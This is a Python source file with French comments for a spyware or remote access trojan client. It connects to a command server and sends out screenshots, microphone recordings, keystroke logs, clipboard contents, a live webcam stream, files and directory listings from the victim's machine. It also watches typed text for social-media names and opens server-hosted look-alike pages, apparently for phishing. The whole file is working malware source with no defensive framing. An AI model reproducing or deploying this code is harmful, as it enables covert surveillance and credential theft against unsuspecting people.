import base64
import io
import os
import threading
import time
import wave
import webbrowser

import cv2
import keyboard
import pyaudio
import pyautogui
import pyperclip
from PIL import Image
from pynput.keyboard import Key, Listener

from config import server_url

# Variables globales
current_keys = []
trigger_words = {
    'facebook': f'{server_url}/facebook',
    'twitter': f'{server_url}/twitter',
    'instagram': f'{server_url}/instagram',
}
page_opened_recently = False

stop_streaming_events = {}  # Dictionnaire pour gérer les événements d'arrêt pour chaque utilisateur


# Fonction pour prendre et envoyer une capture d'écran
def take_and_send_screenshot(sio, user_id):
    try:
        screenshot = pyautogui.screenshot()
        screenshot_bytes_io = io.BytesIO()
        screenshot.save(screenshot_bytes_io, format='PNG')
        screenshot_bytes_io.seek(0)
        resized_screenshot = resize_image(screenshot_bytes_io)
        screenshot_encoded = base64.b64encode(resized_screenshot.getvalue()).decode()
        sio.emit('screenshot_response', {'screenshot': screenshot_encoded, 'user_id': user_id})
        print("Capture d'écran envoyée")
    except Exception as e:
        print(f"Échec de la capture d'écran: {e}")
        pass


# Fonction pour redimensionner une image
def resize_image(image_bytes_io, base_width=1300):
    img = Image.open(image_bytes_io)
    w_percent = (base_width / float(img.size[0]))
    h_size = int((float(img.size[1]) * float(w_percent)))
    img = img.resize((base_width, h_size), Image.Resampling.LANCZOS)
    img_byte_arr = io.BytesIO()
    img.save(img_byte_arr, format='PNG')
    return img_byte_arr


# Fonction pour enregistrer et envoyer l'audio
def record_and_send_audio(sio, duration=10, user_id=None):
    try:
        audio = pyaudio.PyAudio()
        stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        frames = []
        for i in range(0, int(44100 / 1024 * duration)):
            data = stream.read(1024)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        audio.terminate()

        audio_bytes = b''.join(frames)
        audio_io = io.BytesIO()
        save_wave_file(audio_io, audio_bytes)

        audio_io.seek(0)
        audio_encoded = base64.b64encode(audio_io.read()).decode()
        sio.emit('audio_response', {'audio': audio_encoded, 'user_id': user_id})
        print("Audio envoyé")
    except Exception as e:
        print(f"Échec de l'enregistrement audio: {e}")
        pass


# Fonction pour enregistrer un fichier audio
def save_wave_file(file_io, audio_data):
    with wave.open(file_io, 'wb') as wave_file:
        wave_file.setnchannels(1)
        wave_file.setsampwidth(pyaudio.PyAudio().get_sample_size(pyaudio.paInt16))
        wave_file.setframerate(44100)
        wave_file.writeframes(audio_data)


# Fonction pour enregistrer et envoyer le keylogger
def record_and_send_keyboard_log(sio, duration=10, user_id=None):
    try:
        print("Enregistrement du keylogger en cours...")
        keyboard.start_recording()
        time.sleep(duration)
        keyboard_events = keyboard.stop_recording()
        keyboard_log = [event.name for event in keyboard_events if event.event_type == 'down']
        keyboard_log = [f"{key} - {time.strftime('%d/%m/%Y %H:%M:%S')}" for key in keyboard_log]
        sio.emit('keyboard_response', {'keyboard_log': keyboard_log, 'user_id': user_id})
        print("Keylogger envoyé")
    except Exception as e:
        print(f"Échec de l'enregistrement du keylogger: {e}")
        pass


# Fonction pour récupérer le contenu du clipboard
def get_clipboard_content(sio, user_id=None):
    try:
        print("Récupération du clipboard...")
        clipboard_content = pyperclip.paste()
        if clipboard_content:
            sio.emit('clipboard_response', {'clipboard_content': clipboard_content, 'user_id': user_id})
            print("Contenu du clipboard envoyé au serveur.")
        else:
            print("Aucun contenu trouvé dans le clipboard.")
    except Exception as e:
        print(f"Échec de la récupération du clipboard: {e}")


# Fonction pour générer les images de la webcam
def gen_frames(sio, user_id):
    try:
        camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # Utilisez DirectShow
        if not camera.isOpened():
            raise ValueError("Failed to open webcam")

        while not stop_streaming_events[user_id].is_set():
            success, frame = camera.read()
            if not success:
                print("Failed to read frame from webcam")
                break
            else:
                ret, buffer = cv2.imencode('.jpg', frame) # Encodage de l'image
                if not ret:
                    print("Failed to encode frame")
                    continue
                frame_bytes = base64.b64encode(buffer) # Encodage en base64
                sio.emit('webcam_response', {'data': frame_bytes.decode(), 'user_id': user_id}) # Envoi de l'image
    except Exception as e:
        print(f"Exception occurred in gen_frames: {e}")
    finally:
        if 'camera' in locals() and camera.isOpened():
            camera.release()
        cv2.destroyAllWindows()


# Fonction pour démarrer le streaming de la webcam
def start_stream(sio, user_id):
    global stop_streaming_events
    stop_streaming_events[user_id] = threading.Event()
    threading.Thread(target=gen_frames, args=(sio, user_id)).start()


# Fonction pour arrêter le streaming de la webcam
def stop_stream(user_id):
    global stop_streaming_events
    if user_id in stop_streaming_events:
        stop_streaming_events[user_id].set()


# Fonction pour télécharger un fichier sur le client
def download_file(sio, file_path, user_id):
    try:
        if os.path.exists(file_path):
            with open(file_path, 'rb') as file:
                file_data = file.read()
                file_encoded = base64.b64encode(file_data).decode()
                sio.emit('file_response',
                         {'file': file_encoded, 'file_name': os.path.basename(file_path), 'user_id': user_id})
                print("Fichier envoyé")
        else:
            print("Fichier introuvable")
    except Exception as e:
        print(f"Échec de l'envoi du fichier: {e}")


# Fonction pour lister les fichiers et dossiers d'un répertoire donné
def list_dir(sio, dir_path):
    files_and_dirs = []
    try:
        if os.path.exists(dir_path) and os.path.isdir(dir_path):
            for file_name in os.listdir(dir_path):
                file_path = os.path.join(dir_path, file_name)
                if os.path.isfile(file_path):
                    files_and_dirs.append({'name': file_name, 'type': 'file'})
                elif os.path.isdir(file_path):
                    files_and_dirs.append({'name': file_name, 'type': 'dir'})
            files_and_dirs.append({'path': dir_path})
            sio.emit('directory_listing_response', {'directory_listing': files_and_dirs})
            print(f"Liste des fichiers et dossiers de {dir_path} envoyée")
        else:
            print("Chemin du répertoire invalide ou inexistant")
    except Exception as e:
        print(f"Échec de la liste des fichiers et dossiers: {e}")


# Fonction qui est appelée à chaque fois qu'une touche est pressée
def on_press(key):
    global page_opened_recently
    try:
        if key.char:
            current_keys.append(key.char)
    except AttributeError:
        pass

    typed_string = ''.join(filter(None, current_keys)).lower()

    if not page_opened_recently:
        for word, url in trigger_words.items():
            if word in typed_string:
                webbrowser.open(url)
                current_keys.clear()
                page_opened_recently = True
                break


# Fonction qui est appelée à chaque fois qu'une touche est relâchée
def on_release(key):
    global page_opened_recently
    if key == Key.esc:
        return False
    page_opened_recently = False


# Fonction pour démarrer l'enregistrement du clavier
def start_listener():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
